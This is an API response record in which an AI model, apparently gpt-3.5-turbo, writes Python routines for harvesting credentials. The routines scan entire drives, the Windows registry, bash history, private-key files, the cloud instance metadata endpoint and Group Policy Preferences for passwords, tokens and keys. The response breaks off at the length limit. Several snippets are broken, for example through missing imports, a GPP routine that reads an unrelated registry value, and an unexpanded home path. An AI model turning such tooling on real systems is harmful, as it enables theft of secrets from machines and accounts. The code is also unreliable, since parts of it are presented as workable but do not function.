{
  "id":"chatcmpl-8MefY9qYd0pPfJ95Qk7W0JGioB78f",
  "object":"chat.completion",
  "created":1700410240,
  "model":"gpt-3.5-turbo-0613",
  "choices":[
    {
      "index":0,
      "message":{
        "role":"assistant",
        "content":"[可實現]\n\n1. 使用套件: os, glob, re\n   功能: 搜尋本機檔案系統和遠端檔案分享，尋找含有不安全儲存的憑證\n   程式碼1:\n\n```python\nimport os\nimport glob\nimport re\n\ndef search_files(credentials_regex):\n    found_files = []\n    for root, dirs, files in os.walk('/'):\n        for file in files:\n            full_path = os.path.join(root, file)\n            try:\n                with open(full_path, 'r') as f:\n                    content = f.read()\n                    if re.search(credentials_regex, content):\n                        found_files.append(full_path)\n            except:\n                pass\n    return found_files\n\ncredentials_regex = r'password|api_key|token'\nfound_files = search_files(credentials_regex)\nfor file in found_files:\n    print(file)\n```\n\n   程式碼2:\n\n```python\nimport os\nimport glob\nimport re\n\ndef search_files(credentials_regex):\n    found_files = []\n    for drive in ['C:', 'D:', 'E:']:  # 搜索指定磁盘驱动器\n        pattern = drive + '**/*'  # 搜索指定路径下的所有子文件夹和文件\n        for file in glob.glob(pattern, recursive=True):\n            try:\n                with open(file, 'r') as f:\n                    content = f.read()\n                    if re.search(credentials_regex, content):\n                        found_files.append(file)\n            except:\n                pass\n    return found_files\n\ncredentials_regex = r'password|api_key|token'\nfound_files = search_files(credentials_regex)\nfor file in found_files:\n    print(file)\n```\n\n   程式碼3:\n\n```python\nimport os\nimport glob\nimport re\n\ndef search_files(credentials_regex):\n    found_files = []\n    for drive in range(ord('C'), ord('Z') + 1):  # 搜索从C到Z的磁盘驱动器\n        drive = chr(drive) + ':'\n        for root, dirs, files in os.walk(drive):\n            for file in files:\n                full_path = os.path.join(root, file)\n                try:\n                    with open(full_path, 'r') as f:\n                        content = f.read()\n                        if re.search(credentials_regex, content):\n                            found_files.append(full_path)\n                except:\n                    pass\n    return found_files\n\ncredentials_regex = r'password|api_key|token'\nfound_files = search_files(credentials_regex)\nfor file in found_files:\n    print(file)\n```\n\n2. 使用套件: winreg\n   功能: 搜尋Windows Registry，尋找不安全儲存的憑證\n   程式碼1:\n\n```python\nimport winreg\n\ndef search_registry(key_path, credentials_regex):\n    found_credentials = []\n    try:\n        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)\n        try:\n            subkeys_count, values_count, modified_time = winreg.QueryInfoKey(reg_key)\n            for i in range(subkeys_count):\n                subkey_name = winreg.EnumKey(reg_key, i)\n                subkey_path = key_path + '\\\\' + subkey_name\n                found_credentials += search_registry(subkey_path, credentials_regex)\n        except:\n            pass\n        for i in range(values_count):\n            value = winreg.EnumValue(reg_key, i)\n            name, data, _ = value\n            if re.search(credentials_regex, str(data)):\n                found_credentials.append(name)\n    except:\n        pass\n    return found_credentials\n\ncredentials_regex = r'password|api_key|token'\nfound_credentials = search_registry('SOFTWARE', credentials_regex)\nfor credential in found_credentials:\n    print(credential)\n```\n\n   程式碼2:\n\n```python\nimport winreg\n\ndef search_registry(root_key, key_path, credentials_regex):\n    found_credentials = []\n    try:\n        reg_key = winreg.OpenKey(root_key, key_path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)\n        try:\n            subkeys_count, values_count, _ = winreg.QueryInfoKey(reg_key)\n            for i in range(subkeys_count):\n                subkey_name = winreg.EnumKey(reg_key, i)\n                subkey_path = key_path + '\\\\' + subkey_name\n                found_credentials += search_registry(root_key, subkey_path, credentials_regex)\n        except:\n            pass\n        for i in range(values_count):\n            value_name, data, _ = winreg.EnumValue(reg_key, i)\n            if re.search(credentials_regex, str(value_name)):\n                found_credentials.append(value_name)\n            if re.search(credentials_regex, str(data)):\n                found_credentials.append(data)\n    except:\n        pass\n    return found_credentials\n\ncredentials_regex = r'password|api_key|token'\nfound_credentials = search_registry(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE', credentials_regex)\nfor credential in found_credentials:\n    print(credential)\n```\n\n   程式碼3:\n\n```python\nimport winreg\n\ndef search_registry(root_key, key_path, credentials_regex):\n    found_credentials = []\n    try:\n        reg_key = winreg.OpenKey(root_key, key_path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)\n        try:\n            subkeys_count, values_count, _ = winreg.QueryInfoKey(reg_key)\n            for i in range(subkeys_count):\n                subkey_name = winreg.EnumKey(reg_key, i)\n                subkey_path = key_path + '\\\\' + subkey_name\n                found_credentials += search_registry(root_key, subkey_path, credentials_regex)\n        except:\n            pass\n        for i in range(values_count):\n            value_name, data, _ = winreg.EnumValue(reg_key, i)\n            if re.search(credentials_regex, str(value_name)) or re.search(credentials_regex, str(data)):\n                found_credentials.append((value_name, data))\n    except:\n        pass\n    return found_credentials\n\ncredentials_regex = r'password|api_key|token'\nfound_credentials = search_registry(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE', credentials_regex)\nfor credential in found_credentials:\n    print(credential)\n```\n\n3. 使用套件: subprocess\n   功能: 在bash命令記錄中搜尋不安全儲存的憑證\n   程式碼1:\n\n```python\nimport subprocess\n\ndef search_bash_history(credentials_regex):\n    try:\n        bash_history = subprocess.check_output('cat ~/.bash_history', shell=True, encoding='utf-8')\n        found_credentials = re.findall(credentials_regex, bash_history)\n        return found_credentials\n    except:\n        return []\n\ncredentials_regex = r'password|api_key|token'\nfound_credentials = search_bash_history(credentials_regex)\nfor credential in found_credentials:\n    print(credential)\n```\n\n   程式碼2:\n\n```python\nimport subprocess\n\ndef search_bash_history(credentials_regex):\n    try:\n        bash_history = subprocess.check_output('cat ~/.bash_history', shell=True, universal_newlines=True)\n        found_credentials = re.findall(credentials_regex, bash_history)\n        return found_credentials\n    except:\n        return []\n\ncredentials_regex = r'password|api_key|token'\nfound_credentials = search_bash_history(credentials_regex)\nfor credential in found_credentials:\n    print(credential)\n```\n\n   程式碼3:\n\n```python\nimport subprocess\n\ndef search_bash_history(credentials_regex):\n    try:\n        p = subprocess.Popen(['cat', '~/.bash_history'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = p.communicate()\n        bash_history = stdout.decode('utf-8')\n        found_credentials = re.findall(credentials_regex, bash_history)\n        return found_credentials\n    except:\n        return []\n\ncredentials_regex = r'password|api_key|token'\nfound_credentials = search_bash_history(credentials_regex)\nfor credential in found_credentials:\n    print(credential)\n```\n\n4. 使用套件: os, glob, re\n   功能: 搜尋私密金鑰憑證檔案\n   程式碼1:\n\n```python\nimport os\nimport glob\nimport re\n\ndef search_private_key_files(credentials_regex):\n    found_files = []\n    for root, dirs, files in os.walk('/'):\n        for file in files:\n            if any(file.endswith(extension) for extension in ['.key', '.pgp', '.gpg', '.ppk', '.p12', '.pem', '.pfx', '.cer', '.p7b', '.asc']):\n                full_path = os.path.join(root, file)\n                found_files.append(full_path)\n    return found_files\n\ncredentials_regex = r'password|api_key|token'\nfound_files = search_private_key_files(credentials_regex)\nfor file in found_files:\n    print(file)\n```\n\n   程式碼2:\n\n```python\nimport os\nimport glob\nimport re\n\ndef search_private_key_files(credentials_regex):\n    found_files = []\n    for drive in ['C:', 'D:', 'E:']:  # 搜索指定磁盘驱动器\n        pattern = drive + '**/*'  # 搜索指定路径下的所有子文件夹和文件\n        for file in glob.glob(pattern, recursive=True):\n            if any(file.endswith(extension) for extension in ['.key', '.pgp', '.gpg', '.ppk', '.p12', '.pem', '.pfx', '.cer', '.p7b', '.asc']):\n                found_files.append(file)\n    return found_files\n\ncredentials_regex = r'password|api_key|token'\nfound_files = search_private_key_files(credentials_regex)\nfor file in found_files:\n    print(file)\n```\n\n   程式碼3:\n\n```python\nimport os\nimport glob\nimport re\n\ndef search_private_key_files(credentials_regex):\n    found_files = []\n    for drive in range(ord('C'), ord('Z') + 1):  # 搜索从C到Z的磁盘驱动器\n        drive = chr(drive) + ':'\n        for root, dirs, files in os.walk(drive):\n            for file in files:\n                if any(file.endswith(extension) for extension in ['.key', '.pgp', '.gpg', '.ppk', '.p12', '.pem', '.pfx', '.cer', '.p7b', '.asc']):\n                    full_path = os.path.join(root, file)\n                    found_files.append(full_path)\n    return found_files\n\ncredentials_regex = r'password|api_key|token'\nfound_files = search_private_key_files(credentials_regex)\nfor file in found_files:\n    print(file)\n```\n\n5. 使用套件: requests\n   功能: 嘗試存取雲端實例元數據API，以收集憑證和其他敏感資料\n   程式碼1:\n\n```python\nimport requests\n\ndef access_instance_metadata_api(url):\n    try:\n        response = requests.get(url, timeout=5)\n        content = response.text\n        found_credentials = re.findall(credentials_regex, content)\n        return found_credentials\n    except:\n        return []\n\ncredentials_regex = r'password|api_key|token'\nfound_credentials = access_instance_metadata_api('http://169.254.169.254/latest/meta-data/')\nfor credential in found_credentials:\n    print(credential)\n```\n\n   程式碼2:\n\n```python\nimport requests\n\ndef access_instance_metadata_api(url):\n    try:\n        response = requests.get(url, timeout=5)\n        content = response.text\n        found_credentials = re.findall(credentials_regex, content)\n        return found_credentials\n    except:\n        return []\n\ncredentials_regex = r'password|api_key|token'\nfound_credentials = access_instance_metadata_api('http://169.254.169.254')\nfor credential in found_credentials:\n    print(credential)\n```\n\n   程式碼3:\n\n```python\nimport requests\n\ndef access_instance_metadata_api(url):\n    try:\n        response = requests.get(url, timeout=5)\n        content = response.text\n        found_credentials = re.findall(credentials_regex, content)\n        return found_credentials\n    except:\n        return []\n\ncredentials_regex = r'password|api_key|token'\nfound_credentials = access_instance_metadata_api('http://[::1]/latest/meta-data/')\nfor credential in found_credentials:\n    print(credential)\n```\n\n6. 使用套件: winreg\n   功能: 搜尋Group Policy Preferences (GPP)中的不安全憑證\n   程式碼1:\n\n```python\nimport winreg\n\ndef search_group_policy_preferences(credentials_regex):\n    found_credentials = []\n    try:\n        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon', 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)\n        try:\n            _, value_type = winreg.QueryValueEx(reg_key, 'GpNetworkStartTimeoutPolicyValue')\n            enc_credentials = value_type[28:]\n            credentials = base64.b64decode(enc_credentials)\n            found_credentials.append(credentials)\n        except:\n            pass\n    except:\n        pass\n    return found_credentials\n\ncredentials_regex = r'password|api_key|token'\nfound_credentials = search_group_policy_preferences(credentials_regex)\nfor credential in found_credentials"
      },
      "finish_reason":"length"
    }
  ],
  "usage":{
    "prompt_tokens":1177,
    "completion_tokens":2921,
    "total_tokens":4098
  }
}